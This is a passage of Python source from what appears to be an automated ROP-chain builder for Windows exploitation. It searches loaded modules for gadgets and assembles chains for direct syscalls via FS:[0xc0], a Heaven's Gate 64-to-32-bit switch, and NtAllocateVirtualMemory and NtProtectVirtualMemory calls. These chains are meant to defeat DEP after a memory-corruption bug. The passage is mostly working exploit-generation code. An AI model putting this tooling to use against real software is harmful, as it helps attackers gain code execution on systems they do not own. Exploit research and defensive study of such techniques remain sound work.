							excludeRegs2,availableRegs2= regsAvailtoExclude(availableRegs2,excludeRegs2)
							# print (red,"rTrans==op2",res, "oldRTrans", oldRTrans,"rTrans", rTrans, "op2", op2, "reg", reg)
							cS1=pkBuild([cS1,gT])
							sysTReg=rF
						if not foundT:
							# print (red, "Need Continue", res)
							continuePlease
					foundPu1, pu1, pushD1 = findPush(rTrans,bad,True,excludeRegs2)
					if foundPu1:
						dp ("have pushret", pu1,disOffset(pu1))
						sysTarget=pu1
						excludeRegs3,availableRegs3 =regsAvailtoExclude(availableRegs2,excludeRegs2)
						tryThis= hex(img(sysTarget)) + " -> " + disOffset(sysTarget)
						foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs3,img(sysTarget)," Ptr to way of invoking syscall, "+tryThis + " # " + rTrans +" = value from dword ptr fs:[" + sysTRegOrig +"]")
						if foundPu1 and foundL1 and foundS:
							pkLoadSys=pkBuild([cS1,chP])
							# showChain(pkLoadSys, True)
							# print (red,"WE HAVE IT",res)
							finishedSys=True
							if r not in excludeRegs3:
								excludeRegs3.append(r)
								excludeRegs2,availableRegs3= regsAvailtoExclude(availableRegs3,excludeRegs3)
							break
				#print (red,"got to the end of the line",res, "found", foundS )

			if continuePlease:
				#print (red,"continue 4",res)
				continue  		

			if finishedSys:
				#print (red,"finishedSys yes",res)
				return True, s1,sysTarget, pkLoadSys,excludeRegs2c,excludeRegs3,availableRegs3,chP3, gT2,needGT2,sysStyle
			#print (red,"got to the end of the line",res, "found", foundS )
	

	if finishedSys:
		#print (gre, "returning",cya," finishedSys",res)
		return True, s1,sysTarget, pkLoadSys,excludeRegs2c,excludeRegs3,availableRegs3,chP3, gT2,needGT2,sysStyle
	else:
		return False,s1,0,0,0,0,0,0,0,0,0
	

def findFSSubDword(reg, op2,availableRegs,excludeRegs,bad,espDesiredMovement, curPk,length1):
	dp ("subdword check", availableRegs)
	sysStyle="subDword"
	excludeRegs=list(set(excludeRegs))
	#print (red,"excludeRegs", excludeRegs,res)
	finishedSys=False

	for r in availableRegs:
		finishedSys=False
		excludeRegs2=[]
		c3Status="c3"
		continuePlease=False
		sameRegs=False
		cAC0=0
		skips=set()
		sysRemaining=True
		while True:
			if sysRemaining==False:
				break
			foundS, s1, stackPivotAmount, isRegOpOff, fsReg, offsetComp,decOffsetComp,changedRegs,movedFS, newRegFS,syscallValAtESP, skips,sysRemaining = findGenericSys("subFS",r,bad,False, excludeRegs,reg,op2,espDesiredMovement,skips)
			needGT2=False
			checkRopTester()   
			if fsReg==None:
				fsReg=fg.rop[s1].FSIndex
			if foundS:
				if fg.rop[s1].op1 in fg.rop[s1].op2:
					sameRegs=True
			if not foundS:
				# print (cya, r, mag,"subdword continue 1",res,hex(s1))
				continue		
			if stackPivotAmount ==0:
				cS1=chainObj(s1,  "Capture FS:[0xc0]", [])
			else:
				filler=genFiller(stackPivotAmount)
				cS1=chainObj(s1,  "Capture FS:[0xc0]", filler)
			cS1=pkBuild([cS1])#,gT4])
			# print (yel, "start")
			# showChain(cS1,True)
			# print(res)
			# print ("infoDump: ",fsReg, "availableRegs", availableRegs )
			if foundS and (fsReg=="eax" or fsReg in availableRegs):
				# print ("yes")
				availableRegs2= copy.deepcopy(availableRegs)
			else:
				# print ("continue - problems with FS founds sub")
				continue
			for rF in availableRegs2:
				finishedSys=False
				sysTReg=fsReg
				sysTRegOrig=sysTReg
				sysTarget=s1
				rTrans=r
				excludeRegs2c= copy.deepcopy(excludeRegs)
				foundTransfers1=False
				foundTransfers2=False
				foundTransfers1, foundTransfers2,gT2,gT3,newReg = saveMemPtrRestoreSingle(reg, rF,excludeRegs,  bad, espDesiredMovement, length1,rTrans,changedRegs)
				#print (cya,"\trf", "newReg", newReg,res,rF,"availableRegs", availableRegs, "excludeRegs", excludeRegs)
				if not foundTransfers1:
					# print (mag,"foundTransfers1 continue",res, hex(s1))
					continue
				if foundTransfers1 and foundTransfers2:
					excludeRegs2c.append(newReg)
					availableRegs2.remove(newReg)
				foundNN, gNN =findNegOrNot(rTrans,bad,length1, excludeRegs2c,espDesiredMovement,"")
				if not foundNN:
					foundNN, nnReg, gNN=findNegOrNotTransfer(rTrans,bad,length1, excludeRegs2c,espDesiredMovement,True,"")
					if foundNN:
						pk=pkBuild([gNN])
						rTrans=nnReg
						# showChain(pk,True)
					else:
						# print (cya, r, rF,mag,"subdword continue 2",res,hex(s1), cya,rF,res)
						continue 
				# print ("isRegOpOff",isRegOpOff, disOffset(s1), yel, offsetComp, res)
				if rTrans=="eax":
					# print(cya, r, rF,red,"continue - rTrans eax",res)
					continue
				if not sameRegs:
					foundZ, cZ=findZero(r,bad,length1, excludeRegs2c,espDesiredMovement)
					if not foundZ:
						# print (cya, r,rF, mag,"subdword continue 3",res,hex(s1))
						continue
					if isRegOpOff:
						foundC2, pCo2, chCom2 = loadReg(fsReg,bad,True,excludeRegs2c,offsetComp," Load reg with value to compensate for +/- offset; equals 0xc0")
						if foundC2:
							# showChain(pkBuild([chCom2]),True)
							pass
						if not foundC2:
							continueFlag=True  # TODO
				else:
					availableRegs3= copy.deepcopy(availableRegs2)
					excludeRegs2b= copy.deepcopy(excludeRegs2c)
					for rB in availableRegs3:
						excludeRegs2b.append(rB)
						foundAddC0, cAC0=subByC0(r,rB, bad,length1,excludeRegs2b,espDesiredMovement,"comment")
						if foundAddC0:
							# print(cya, "this is for cAC0")
							# pk=pkBuild([cAC0])
							# showChain(pk,True)
							# print(res)
							break
				if not sameRegs:
					if not isRegOpOff:
						cS1b=pkBuild([cZ,cS1,gNN])
						cS1c=pkBuild([cZ,cS1])
					else:
						cS1b=pkBuild([cZ,chCom2,cS1,gNN])
						cS1c=pkBuild([cZ,chCom2,cS1])
				elif sameRegs:
					cS1b=pkBuild([cS1, cAC0, gNN])
					cS1c=pkBuild([cS1,cAC0])
				# print (red,"fsReg", fsReg,res)
				foundL3, pS, chP3 = loadReg(fsReg,bad,True,excludeRegs2c,0xc0," Load with address pointed to by fs:0xc0 to initiate syscall2")
				if not foundL3:
					# print (cya, r, rF,mag,"subdword continue 5",res,hex(s1))
					continue
				testCur1=pkBuild([curPk,chP3])				
				testCur2=pkBuild([curPk,chP3, cS1c])
				myGOutput=runEmGetRegAtCurLoc(pe,n,testCur1 ,0x4000,"dec",2) 
				before1=(myGOutput.giveRegLoc(reg))
				myGOutput=runEmGetRegAtCurLoc(pe,n,testCur2,0x4000,"dec",2)
				after1=myGOutput.giveRegLoc(reg)
				memRegChanges=False
				if before1!=after1:
					memRegChanges=True
					#print (red, memRegChanges,"memRegChangesSub",res, "foundTransfers2",foundTransfers2)
				if (fsReg==reg and foundTransfers1 and foundTransfers2) or (foundTransfers1 and foundTransfers2 and memRegChanges):
					if fsReg!="eax":
						cS1b=pkBuild([gT2,cS1b,gT3])
					else:
						cS1b=pkBuild([cS1b,gT3])
						needGT2=False					
					# print (red,fg.rop[s1].FSIndex, fsReg, disOffset(s1),res)
					# print ("S2")
					# showChain(cS1b, True)
				elif memRegChanges and not foundTransfers2:
					# print (cya, r,rF, mag,"continue -  memRegChanges but not foundTransfers",res)
					continue
				# print (res)
				# print ("S1")
				# showChain(cS1b, True)
				# NOT INVESTIGATED THIS ONE
				if rTrans==op2:
				# if 1==1:
					for r3 in regsNotUsed:
						foundT, gT = findUniTransfer("30",r3,rTrans, bad,length1,excludeRegs2,espDesiredMovement, "Transfer  FS:[0xc0] to to " + r3)
						rTrans=r3
						if foundT and  r3 != op2:
							excludeRegs2.append(r3)
							excludeRegs2,regsNotUsed= regsAvailtoExclude(availableRegs,excludeRegs2)
							break
					cS1b=pkBuild([cS1b,gT])
					# print ("S3")
					# showChain(cS1b, True)
					sysTReg=r3
				foundPu1, pu1, pushD1 = findPush(rTrans,bad,True,excludeRegs2)
				if foundPu1:
					sysTarget=pu1
					excludeRegs3,regsNotUsed2= regsAvailtoExclude(availableRegs,excludeRegs2)
					tryThis= hex(img(sysTarget)) + " -> " + disOffset(sysTarget)
					foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs3,img(sysTarget)," Ptr to way of invoking syscall, "+tryThis + " # " + rTrans +" = value from dword ptr fs:[" + sysTRegOrig +"]")
					if foundPu1 and foundL1 and foundS:
						pkLoadSys=pkBuild([cS1b,chP])
						finishedSys=True
						# print ("final s")
						# showChain(pkLoadSys, True)
						if r not in excludeRegs3:
							excludeRegs3.append(fg.rop[sysTarget].op1)
							excludeRegs2,regsNotUsed2= regsAvailtoExclude(regsNotUsed2,excludeRegs3)
							# print (red,"breaking!",res)
						break
			if continuePlease:
				# print (cya, r, rF,mag,"subdword continue 6",res, hex(s1))
				continue	
			if finishedSys:
				#print (red,"finishedSys yes",res)
				return True, s1,sysTarget, pkLoadSys,excludeRegs2c,excludeRegs3,regsNotUsed2,chP3, gT2,needGT2,sysStyle
			#print (red,"got to the end of the line",res, "found", foundS )
	if finishedSys:
		#print (gre, "returning",cya," finishedSys",res)
		return True, s1,sysTarget, pkLoadSys,excludeRegs2c,excludeRegs3,regsNotUsed2,chP3, gT2,needGT2,sysStyle
	else:
		# try:
		# 	print (cya, r, rF,res,"NOT finishedSys")
		# except:
		# 	print (cya, r,res,"NOT finishedSys")
		return False,s1,0,0,0,0,0,0,0,0,0
	return False,s1,0,0,0,0,0,0,0,0,0


def helperMovDerefNoLoad(reg,op2,bad,length1, regsNotUsed,espDesiredMovement,val,comment=None):
	excludeRegs= regsAvailtoExclude(regsNotUsed)
	foundM1, m1 = findMovDeref(reg,op2,bad,length1, excludeRegs)
	if not foundM1:
		return False,0
	foundInc, i1 = findGeneric("dec",reg,bad,length1, regsNotUsed,espDesiredMovement)
	# if foundInc:
	# 	plpflOldProtect=myArgs[4]
	# 	plfNewProtect=myArgs[3]
	# 	pdwSize=myArgs[2]
	# 	pReturnAddress=myArgs[1]
	# 	plpAddress=myArgs[0]
	# 	pVirtualProtect=0x7877badd
	if not foundInc:
		return False,0
	if foundM1 and foundInc:
		if comment==None:
			cM=chainObj(m1, "Write param to mem", [])
		else:
			cM=chainObj(m1, comment, [])
		cI=chainObj(i1, "Decrement " + reg, [])
		package=([cM, cI,cI,cI,cI])
		return True, package
	else:
		return False,0


def rg(val):
	# dp ("val", val, type(val))
	# print (val)
	# print("hex",hex(val))
	rg=struct.pack("<I", val)
	return rg

def signedNegHexTo(signedVal):
	strSigned=str(hex(signedVal))
	ba = binascii.a2b_hex(strSigned[2:])
	new = (int.from_bytes(ba, byteorder='big', signed=True))
	return new
		


def addToBase(imgBase, imgSize):
	dp("addToBase",hex(imgBase), hex(imgSize))
	imgBase+=imgSize
	start= hex(imgBase)
	start=int(start[0:4]+"0000",16)
	dp (1,"start_before", hex(start))

	while start < imgBase:
		start=start+0x10000	

	dp (2,"start_after", hex(start))
	return start


def genBasesForEm():
	genBasesForEmNew()
	if 2==3:
		# return
		dp ("genBasesForEm")
		baseImg=0x300000
		prevSize=0
		t=0
		for img in pe:
			if len(pe[img].data) > 1:
				imgSize=len(pe[img].data)
				# dp ("size:",hex(imgSize),img)
				if t==0:		
					pe[img].emBase=baseImg
					# dp ("\tbaseImg:", hex(baseImg), img)
					prevSize=imgSize
				else:
					baseImg=addToBase(baseImg,prevSize)
					pe[img].emBase=baseImg
					prevSize=imgSize
					# dp ("\tbaseImg:", hex(baseImg), img)
				t+=1
		# dp("\n\n")

def genBasesForEmNew():
	# return
	dp ("genBasesForEm")
	baseImg=0x300000
	baseDLL=0x2005000
	prevSize=0
	t=0
	curAddresses=[]
	# curAddresses.append((0x6fc31000, 0x6fc32000,"ghost"))
	for img in pe:
		badFlag=False
		if len(pe[img].data) > 1:
			imgSize=len(pe[img].data)+0x4000
			# dp ("size:",hex(imgSize),img)
			# print(cya,img, res,hex(pe[img].startLoc),hex(pe[img].startLoc+imgSize) )
			if t==0:		
				# pe[img].emBase=baseImg
				# print ("emBase",hex(pe[img].emBase))
				pe[img].emBase=pe[img].startLoc
				# print("startLoc",hex(pe[img].startLoc))
				# dp ("\tbaseImg:", hex(baseImg), img)
				# print ("emBase",hex(pe[img].emBase))

				prevSize=imgSize
			else:
				for e in curAddresses:
					if pe[img].startLoc >= e[0] and pe[img].startLoc <= e[1]:
						# print("bad1", img, e[2])
						badFlag=True
					if pe[img].startLoc+imgSize >= e[0] and pe[img].startLoc+imgSize <= e[1]:
						# print("bad2", img, e[2])
						badFlag=True
					if e[0] >= pe[img].startLoc and e[0]<= pe[img].startLoc+imgSize: 
						# print("bad3", img, e[2])
						badFlag=True
					if e[1] >= pe[img].startLoc and e[1] <= pe[img].startLoc +imgSize:
						# print("bad4", img, e[2])
						badFlag=True
				if pe[img].systemWin:
					badFlag=True
				baseDLL=addToBase(baseDLL,prevSize)
				# pe[img].emBase=baseImg #old way
				if not badFlag:
					baseImg=pe[img].startLoc
					pe[img].emBase=baseImg #old way
				else:
					baseImg=baseDLL
					pe[img].emBase=baseImg #old way
				curAddresses.append((baseImg, baseImg+imgSize,img))
				prevSize=imgSize				
			t+=1

	# for img in pe:
		# print(yel,img, res,hex(pe[img].emBase),hex(pe[img].emBase+imgSize) )

def genStackForRopChain(gList):
	ch=b""
	for g in gList:
		ch+=rg(g)
	return ch
def buildRopChainTemp(gadgets,offsets=None):
	dp("buildRopChainTemp")
	rc=b''
	rc3=b''
	prevStackC2=b''
	for obj in gadgets:
		# dp("offset:", hex(obj.g.offset),"emBase:",hex(pe[obj.g.mod].emBase))
		leStack=genStackForRopChain(obj.stack)

		rc += rg(obj.g.offset) # without base
		rc3 += rg(obj.g.offset + pe[obj.g.mod].emBase) + prevStackC2+ genStackForRopChain(obj.stack) # with base
		# dp ("bytes:", binaryToStr(rg(obj.g.offset + pe[obj.g.mod].emBase) + genStackForRopChain(obj.stack)),"\n")

		try:
			test=len(obj.g.stC2)   # this is just in case it is not there - backwards compatibility for earlier users
		except:
			print (type(obj), type(obj.g))
			obj.g.stC2=[]
		prevStackC2=genStackForRopChain(obj.g.stC2)

	dp("\n\n\nfinal rc3",binaryToStr(rc3))
	return rc3

def genPayload(val, patType=None):
	dp ('genPayload', val, patType)
	payload=""
	if val == "targetDllString" and (patType==None or patType=="lpProcName"):
		dp ("targetDllString genPayload")
		s =distanceDict["targetDllString"]["loc1"]["String"] 
		payload=bytes(s,'utf-8')+b'\x00\x00'
		s2 =distanceDict["targetDllString"]["loc2"]["String"] 
		payload+=bytes(s2,'utf-8')+b'\x00\x00'
	elif val=="System":
		dp ('system genPayload')
		s =distanceDict["targetDllString"]["loc1"]["String"] 
		payload=bytes(s,'utf-8')+b'\x00\x00'
		s2 =distanceDict["targetDllString"]["loc2"]["String"] 
		payload+=bytes(s2,'utf-8')+b'\x00\x00'
		s3 =distanceDict["targetDllString"]["loc3"]["String"] 
		payload+=bytes(s3,'utf-8')+b'\x00\x00'
	return payload

def buildRopChainTempMore(gadgets,rValStr,patType=None):
	dp ("buildRopChainTempMore", rValStr, patType)
	payload=genPayload(rValStr,patType)

	starting=distanceDict[rValStr]["distanceToPayload"]
	dp("buildRopChainTemp starting" ,  hex(starting))
	rc=b''
	rc3=b''
	gadgets=pkBuild([gadgets])
	prevStackC2=b''
	for obj in gadgets:
		# dp ("gadget i", obj)
		# dp("offset:", hex(obj.g.offset),"emBase:",hex(pe[obj.g.mod].emBase))
		leStack=genStackForRopChain(obj.stack)
		rc += rg(obj.g.offset) # without base
		rc3 += rg(obj.g.offset + pe[obj.g.mod].emBase) +prevStackC2+ genStackForRopChain(obj.stack) # with base
		# rc3+=
		try:
			test=len(obj.g.stC2)   # this is just in case it is not there - backwards compatibility for earlier users
		except:
			obj.g.stC2=[]
		prevStackC2=genStackForRopChain(obj.g.stC2)
	# dp(binaryToStr(rc))
	dp("\n\n\nfinal rc3",binaryToStr(rc3))
	filler=b"\x41"
	if len(rc3) < starting:
		need = starting - len(rc3)
		dp (hex(starting), hex(len(rc3)), hex(need))
		extra=filler*need
		dp(len(extra))
		dp ("rc3", type(rc3), rc3)
		# newP=bytes(payload,'utf-8')
		dp ("payload", payload)
		dp (len(payload))
		rc3+=extra + payload

	### TODO if rop chain too big alrady, increase distance from - return this as updated info
	dp (rc3)

	return rc3


def genNull(excludeRegs,bad):
	return 0

rL={"eax":"rax","ebx":"rbx","ecx":"rcx","edx":"rdx","esi":"rsi","edi":"rdi","esp":"rsp","ebp":"rbp","r8":"r8 ","r9":"r9 ","r10":"r10","r11":"r11","r12":"r12","r13":"r13","r14":"r14","r15":"r15"}

def findSPivot64(bad,excludeRegs, reg):
	length1=True
	foundM1, m1 = findGenericOp264("xchg","RSP",reg, "esp", bad,length1, excludeRegs,0)
	if foundM1:
		dp ("IT IS FOUND sp")
		gM1=chainObj(m1, "", [])
		return True, gM1

	foundM1, m1 = findGenericOp264("xchg",rL[reg], "esp",reg, bad,length1, excludeRegs,0)
	if foundM1:
		dp ("IT IS FOUND sp 2")
		gM1=chainObj(m1, "", [])
		return True, gM1

	if not foundM1:
		dp ("IT IS NOT FOUND sp")

		return False,-0x6


def buildHG(bad,excludeRegs):
	dp ("excludeRegs",excludeRegs,	 "bad", bad)
	global rl
	distEsp=0x300  # distance to start of parameters  - user input
	distEsp2=0x300
	distParam=0x55 # distance to lp parameter    - dynamically generated  possibly via emulation?  how has the stack changed since that point in time--run all gadgets previous to this in emulation to determine the offset needed.
	distFinalESP=0x34  # distance to esp at end - dynamically generated. This is just a starting point - emulation will correct to the actual value.
	destAfter=True
	IncDec="dec"
	# availableRegs=["eax","ebx","ecx","edx", "esi","edi","ebp"]

	# availableRegs=["rax","rbx","rcx","rdx","rsi","rdi","rsp","rbp","r8 ","r9 ","r10","r11","r12","r13","r14","r15"]
	# availableRegs=[("rax", "eax"),("rbx", "ebx"),("rcx", "ecx"),("rdx", "edx"),("rsi","esi"),("rdi", "edi"),("rsp", "esp"),("rbp", "ebp"),("r8 ", "r8"),("r9 ", "r9"),("r10", "r10"),("r11", "r11"),("r12", "r12"),("r13", "r13"),("r14","r14"),("r15", "r15")]
	availableRegs=[	 "eax", "ebx", "ecx", "edx","esi", "edi", "esp", "ebp", "r8", "r9", "r10", "r11", "r12", "r13","r14", "r15","rax"]
	# availableRegsB=["rbx","rcx","rdx","rsi","rdi","rsp","rbp","r8 ","r9 ","r10","r11","r12","r13","r14","r15"]
	

	for reg in excludeRegs:
		availableRegs.remove(reg)
		try:
			availableRegs.remove("esp")
			excludeRegs.append("esp")
		except:
			pass
	length1=True
	espDesiredMovement=0
	package=[]

	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	
	for reg in availableRegs:
		regsNotUsed= copy.deepcopy(availableRegs)
		regsNotUsed.remove(reg)

		#  findGenericOp264(instruction,fgReg, op2, reg,bad,length1, excludeRegs,espDesiredMovement=0):

		foundM1, m1 = findGenericOp264("mov",rL[reg],"esp",reg, bad,length1, excludeRegs,espDesiredMovement)

		foundSP, gSp1=findSPivot64(bad,excludeRegs, reg)

		if foundM1:
			# dp ("IT IS FOUND generic mov 64")
			gM=chainObj(m1, "Capture stack address", [])
			fRet, pR1,rDict=findRet(bad,True)
			fRetf, pRf1,rDict=findRetf(bad, True)
		else:
			continue
		for op2 in regsNotUsed:	
			regsNotUsed2= copy.deepcopy(regsNotUsed)
			regsNotUsed2.remove(op2)
			excludeRegs2= copy.deepcopy(excludeRegs)
			foundA1, a1 = findGenericOp264("add",rL[reg],op2,reg, bad,length1, excludeRegs2,espDesiredMovement)
			if foundA1:
				# dp ("found a1")
				gA1=chainObj(a1, "", [])

			foundP1, p1 = findGeneric64("pop",rL[op2],op2,bad,length1, regsNotUsed2,espDesiredMovement)
			if foundP1:
				# dp ("IT IS FOUND generic pop64")
				gP=chainObj(p1, "Set up our Heaven's Gate in the stack here", [0x200])
			
				break

		for op2 in regsNotUsed:	
			regsNotUsed2= copy.deepcopy(regsNotUsed)
			regsNotUsed2.remove(op2)
			excludeRegs2= copy.deepcopy(excludeRegs)
			foundM1, m1 = findGenericOp264("movQword",rL[reg],op2,rL[reg], bad,length1, excludeRegs2,espDesiredMovement)
			if foundM1:
				dp ("IT IS FOUND generic movqword")
				gM1=chainObj(m1, "", [])
				# break
			if not foundM1:
				dp ("not found eneric movqword!")

			foundP2, p2 = findGeneric64("pop",rL[op2],rL[op2],bad,length1, regsNotUsed2,espDesiredMovement)
			if foundP2:
				dp ("IT IS FOUND pop")
				gPRF=chainObj(p2, "load the retf", [img(pRf1)])
				gPCS=chainObj(p2, "put in 0x23 for CS", [0x23])
				gPDEST=chainObj(p2, "this is our destination - will be 32-bit!", [img(pR1)])
				gPInc=chainObj(p2, "We will advance by 4", [0x4])
				gPFF=chainObj(p2, "Let's go backwards and align reg with RETF", [0xFFFFFFFFFFFFFFF4])
			foundA2, a2 = findGenericOp264("add",rL[reg],op2,reg, bad,length1, excludeRegs2,espDesiredMovement)
			if foundA2:
				dp ("found a2")
				gA2=chainObj(a2, "", [])


				# break
			foundX, x2 = findGeneric64("xorZero",rL[op2],rL[op2],bad,length1, regsNotUsed2,espDesiredMovement)
			if foundX:
				dp ("IT IS FOUND xor")
				gX1=chainObj(x2, "", [])
				# break

	
		if foundP1:
			



			break

	if foundM1 and foundSP and foundA1 and foundP1 and foundP2 and foundA2 and foundX:

		pk=pkBuild([gM,gP,gA1,gPRF,gM1,gPInc,gA2, gX1,gM1,gPInc,gA2, gPDEST,gM1,gPInc,gA2,gPCS,gM1,gPFF, gA2,gSp1])#    gM1,gP2,gX1,pR1,pRf1,gSp1])
		showChain(pk)
		cOut, out=genOutput64(pk)
		print (cOut)
		fgc.addHg64to32(fChainObj(pk,out,cOut))
		printGadgetChain(out, "Heavens_Gate_64_to_32")


	else:
		print ("  Heaven's Gate 64 to 32-bit - chain not found.")
		if opt["bx64Extracted"]==False:
			print(cya+"  Note:"+res+" x64 gadgets are needed. They have not been extracted yet.")
	return
	

def buildMovDerefSyscall(excludeRegs,bad, myArgs ,numArgs):
	dp ("buildMovDerefSyscall")
	dp ("excludeRegs",excludeRegs, "bad", bad)
	SyscallName=(("NtAllocateVirtualMemory",0x18))
	# genBasesForEmNew()
	clearGlobals()
	global PWinApi
	sizeForPtr=myArgs[8]
	protect=myArgs[7]        #6
	allocationType=myArgs[6] #5
	regionSize=myArgs[5]     #4
	zeroBits=myArgs[4]       #3
	baseAddress=myArgs[3]    #2
	processHandle=myArgs[2]  #1
	retAddress1=myArgs[1]
	retAddress2=myArgs[0]

	pVP=myArgs[0]
	dp ("myArgs2", myArgs)

	distEsp=0x250  # distance to start of parameters  - user input
	distParam=0x55 # distance to lp parameter    - dynamically generated  possibly via emulation?  how has the stack changed since that point in time--run all gadgets previous to this in emulation to determine the offset needed.
	distFinalESP=0x34  # distance to esp at end - dynamically generated. This is just a starting point - emulation will correct to the actual value.
	pVP=0x30000
	PWinApi=pVP
	numP=7
	espTargetParm1=0
	destAfter=True
	IncDec="dec"
	syscallSSN=0x18

	availableRegs=["eax", "ebx","ecx","edx", "esi","edi","ebp"]
	dp ("excludeRegs", excludeRegs)
	dp("availableRegs", availableRegs)
	primaryOp2=""

	for reg in excludeRegs:
		availableRegs.remove(reg)
	length1=True
	espDesiredMovement=0
	package=[]
	chainCompleted=False

	for reg in availableRegs:
		# print ("reg:",reg)
		foundMovderef=False
		if chainCompleted:
			break
		foundMovderef=False
		regsNotUsed= copy.deepcopy(availableRegs)
		regsNotUsed.remove(reg)
		for op2 in regsNotUsed:	
			print ("   Checking possibilities", cya,reg,res, ":", yel,op2,res)		
			regsNotUsed2= copy.deepcopy(regsNotUsed)
			regsNotUsed2.remove(op2)
			dp ("op2 regsNotUsed", op2)
			# print ("reg", reg, "op2",op2)
			excludeRegs2,regsNotUsed3= regsAvailtoExclude(regsNotUsed2,excludeRegs)
			foundM1, m1 = findMovDeref(reg,op2,bad,length1, excludeRegs2)
	
			if not foundM1:
				# print("continue 1")
				continue

			foundL1, p1, chP = loadReg(op2,bad,True,excludeRegs2,0,"Null for BaseAddress Ptr")
			if not foundL1:
				# print("continue 2")
				continue

			foundInc, i1 = findGeneric("dec",reg,bad,length1, regsNotUsed2,espDesiredMovement)
			if not foundInc:
				# print("continue 3")
				continue

			if foundM1 and foundL1 and foundInc:
				helperSuccessSV, pkVRSforPtr=helperMovDeref(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement, sizeForPtr, m1,i1,"Size value for Region Size, " + hex(sizeForPtr))
				if not helperSuccessSV:
					# print("continue 4")
					continue

				helperSuccessP6, pkP6=helperMovDeref(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement,protect, m1,i1,"Protect = " + hex(protect))
				if not helperSuccessP6:
					# print("continue 5")
					continue

				helperSuccessP1, pkP1=helperMovDeref(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement,processHandle, m1,i1,"Process Handle = -1")
				if not helperSuccessP1:
					# print("continue 6")
					continue
				

				helperSuccessP3, pkP3=helperMovDeref(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement,zeroBits,m1,i1, "ZeroBits = 0")
				if not helperSuccessP3:
					# print("continue 7")
					continue

				helperSuccessP4, pkP4=helperMovDerefNoLoad(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement, op2, "Write ptr to Region size to mem")
				if not helperSuccessP4:
					# print("continue 8")
					continue

				helperSuccessP2, pkP2=helperMovDerefNoLoad(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement, op2, "Write ptr to BaseAddress to mem")
				if not helperSuccessP2:
					# print("continue 9")
					continue

				fRet, pR,rDict=findRet(bad)
				helperSuccessP5, pkP5=helperMovDeref(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement,allocationType, m1,i1,"AllocationType = " + hex(allocationType))
				if not helperSuccessP5:
					# print("continue 10")
					continue

				helperSuccessRA1, pkRA1=helperMovDeref(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement,img(pR), m1,i1,"Return address #2 - rop nop ", "Write ReturnAddress #1 to mem")
				if not helperSuccessRA1:
					# print("continue 11")
					continue

				helperSuccessRA2, pkRA2=helperMovDeref(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement,img(pR),m1,i1,"Return address #2 - rop nop ","Write ReturnAddress #2 to mem")
				if not helperSuccessRA2:
					# print ("contineu 12")
					continue

				foundT=False
				foundT2=False
				foundInc2=False
				for r3 in regsNotUsed2:
					foundT=False
					foundT2=False
					foundInc2=False
					foundT, gT = findUniTransfer("35",r3,reg, bad,length1,excludeRegs2,espDesiredMovement, "Transfer ptr to Region Size to " + r3)
					if foundT:
						foundT2, gT2 = findUniTransfer("36",op2,r3, bad,length1,excludeRegs2,espDesiredMovement, "Transfer ptr to Region Size to " + op2)
					foundInc2, i2 = findGeneric("inc",op2,bad,length1, regsNotUsed2,espDesiredMovement)
					cI2=chainObj(i2, "Increrement " + op2, [])
					pkInc=([cI2,cI2,cI2,cI2])
					if foundT and foundT2 and foundInc2:	
						# print ("doing the break?")
						break
				if not foundT or not foundT2 or not foundInc2:
					# print ("continue 13")
					continue

				cM=chainObj(m1, "Write param to mem", [])
				cI=chainObj(i1, "Decrement " + reg, [])
				pkZBA=pkBuild([chP,cM, cI,cI,cI,cI])

			foundStart, pkStart=findMovDerefGetStack(reg,bad,length1, excludeRegs2,regsNotUsed2,espDesiredMovement,distEsp)
			if not foundStart:
				# print ("continue 14")
				continue

			if foundStart:
				# print(pkStart,pkZBA,gT,pkVRSforPtr,pkP6, pkP5,gT2,pkP4,pkP3,gT2,pkInc,pkP2, pkP1,pkRA1,pkRA2)
				curPk=pkBuild([pkStart,pkZBA,gT,pkVRSforPtr,pkP6, pkP5,gT2,pkP4,pkP3,gT2,pkInc,pkP2, pkP1,pkRA1,pkRA2])#,pkDW,pkLP,pkRA,pkVP,pkEnd]) #pkFn,pkDW
				foundSys, pkSysSetup=getSyscallSetup(reg,op2,bad,length1, regsNotUsed2,espDesiredMovement,curPk,syscallSSN,distEsp,IncDec,numP,destAfter,distFinalESP,SyscallName,excludeRegs2,m1)
				if not foundSys:
					dp("not foundSys")

				if foundStart and foundSys:
					pk=pkBuild([pkStart,pkZBA,gT,pkVRSforPtr,pkP6, pkP5,gT2,pkP4,pkP3,gT2,pkInc,pkP2, pkP1,pkRA1,pkRA2,pkSysSetup])#,pkDW,pkLP,pkRA,pkVP,pkEnd]) #pkFn,pkDW
					# distParam, apiReached=getDistanceParamReg(pe,n,pk,distEsp,IncDec,numP,1, reg, destAfter)  # pe,n,gadgets, IncDec,numP,targetP,targetR, destAfter
					dp ("\nsyscall chain\n")
					showChain(pk)
					cOut,out=genOutput(pk)
					fgc.addNtAllocate(fChainObj(pk,out,cOut))
					print(cOut)		
					printGadgetChain(out, "w_syscall_NtAllocateVirtualMemory")
					chainCompleted=True
					break
		else:
			print ("NtAllocateVirtualMemory - Chain not found at this time.")

def buildMovDerefSyscallProtect(excludeRegs,bad, myArgs ,numArgs):
	dp ("buildMovDerefSyscallProtect",myArgs)
	dp ("excludeRegs",excludeRegs,	 "bad", bad)
	SyscallName=(("NtProtectVirtualMemory",0x4a))
	clearGlobals()
	outFile.write("The below is for Windows Syscall NtProtectVitualMemory:\n")

	# genBasesForEmNew()
	global PWinApi
	OldAccessPr=myArgs[6] #5
	NewAccessProt=myArgs[5]     #4
	NumberBytesProtect=myArgs[4]       #3
	baseAddress=myArgs[3]    #2
	processHandle=myArgs[2]  #1
	retAddress1=myArgs[1]
	retAddress2=myArgs[0]

	pVP=myArgs[0]
	dp ("myArgs2", myArgs)
	dp("NumberBytesProtect",NumberBytesProtect)

	distEsp=0x500  # distance to start of parameters  - user input
	distEsp2=0x500
	distParam=0x55 # distance to lp parameter    - dynamically generated  possibly via emulation?  how has the stack changed since that point in time--run all gadgets previous to this in emulation to determine the offset needed.
